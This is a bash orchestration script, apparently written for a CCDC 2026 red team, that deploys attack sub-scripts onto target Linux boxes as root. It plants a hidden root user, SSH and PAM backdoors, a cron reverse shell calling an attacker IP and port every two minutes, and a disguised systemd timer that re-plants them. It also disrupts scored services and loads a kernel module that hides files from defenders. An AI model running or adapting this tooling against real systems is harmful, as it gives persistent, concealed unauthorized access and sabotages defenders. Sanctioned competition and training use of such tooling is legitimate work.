#!/usr/bin/env bash
# Master red team deployment script for CCDC 2026.
# Run locally ON each target box (SSH in first, then execute).
# For remote deployment: scp this directory to the box and run there.
#
# Usage:
#   ./deploy_attack.sh [deploy|cleanup] [all|persistence|disrupt|lkm]
#
# Targets:
#   web    → Rocky Ecom    172.20.240.10
#   mail   → Ubuntu Mail   172.20.240.15
#   splunk → Debian Splunk 172.20.240.20
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Config ────────────────────────────────────────────────────────────────────
if [[ -z "${ATTACKER_IP:-}" ]]; then
  read -r -p "[?] Attacker IP (default 172.25.21.1): " ATTACKER_IP
  ATTACKER_IP="${ATTACKER_IP:-172.25.21.1}"
fi
if [[ -z "${ATTACKER_PORT:-}" ]]; then
  read -r -p "[?] Listener port (default 4444): " ATTACKER_PORT
  ATTACKER_PORT="${ATTACKER_PORT:-4444}"
fi
if [[ -z "${ATTACKER_PUBKEY:-}" ]]; then
  read -r -p "[?] SSH public key (leave blank to generate one): " ATTACKER_PUBKEY
fi
if [[ -z "${SHADOW_PASS:-}" ]]; then
  SHADOW_PASS="$(openssl rand -base64 16 | tr -dc 'a-zA-Z0-9' | head -c 16)"
fi
if [[ -z "${MAGIC_PASS:-}" ]]; then
  MAGIC_PASS="$(openssl rand -hex 12)"
fi

export ATTACKER_IP ATTACKER_PORT ATTACKER_PUBKEY SHADOW_PASS MAGIC_PASS SHADOW_USER="${SHADOW_USER:-sys.sync}"

ACTION="${1:-deploy}"
MODE="${2:-all}"

# Detect box type
detect_box() {
  if [[ -d /opt/splunk ]]; then echo "splunk"
  elif [[ -f /usr/sbin/postfix ]] || [[ -d /etc/postfix ]]; then echo "mail"
  elif [[ -d /etc/nginx ]] || [[ -d /etc/httpd ]]; then echo "web"
  else echo "unknown"
  fi
}
BOX_TYPE="$(detect_box)"
echo "[*] Detected box type: ${BOX_TYPE}"

run() {
  local script="$1"
  echo ""
  echo "  ── ${script} ──"
  bash "${DIR}/${script}" "$ACTION" && true || echo "[!] ${script} exited non-zero"
}

# ── Deployment ────────────────────────────────────────────────────────────────
echo ""
echo "══════════════════════════════════════════"
echo "  CCDC 2026 Red Team — ${ACTION^^} (${MODE})"
echo "══════════════════════════════════════════"

if [[ "$MODE" == "all" || "$MODE" == "persistence" ]]; then
  run 01_shadow_root.sh
  run 02_ssh_backdoor.sh
  run 03_pam_backdoor.sh
  run 04_restore_service.sh
  run 05_cron_shell.sh
  run 06_immutable_sweep.sh
fi

if [[ "$MODE" == "all" || "$MODE" == "disrupt" ]]; then
  case "$BOX_TYPE" in
    web)    run 07_disrupt_web.sh ;;
    mail)   run 08_disrupt_mail.sh ;;
    splunk) run 09_disrupt_splunk.sh ;;
    *)      echo "[!] Unknown box type — skipping scoring disruption" ;;
  esac
fi

if [[ "$MODE" == "all" || "$MODE" == "lkm" ]]; then
  echo ""
  echo "  ── lkm/load.sh ──"
  bash "${DIR}/lkm/load.sh" "$ACTION" || echo "[!] LKM step failed (missing kernel-devel?)"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo ""
echo "══════════════════════════════════════════"
echo "  SUMMARY"
echo "══════════════════════════════════════════"
if [[ "$ACTION" == "deploy" ]]; then
  echo "  Box type    : ${BOX_TYPE}"
  echo "  Shadow user : ${SHADOW_USER}  (password printed above)"
  echo "  PAM magic   : ${MAGIC_PASS}"
  echo "  Cron shell  : ${ATTACKER_IP}:${ATTACKER_PORT} every 2 min"
  echo "  SSH key     : /root/.ssh/authorized_keys (immutable)"
  echo "  Restore svc : systemd-network-helper.timer (5 min re-plant)"
  echo ""
  echo "  Blue team must run --immutable FIRST or cleanup will silently fail."
  echo "  PAM backdoor requires manual PAM file edit to remove."
  echo "  LKM hides planted filenames from ls/find."
fi
echo ""
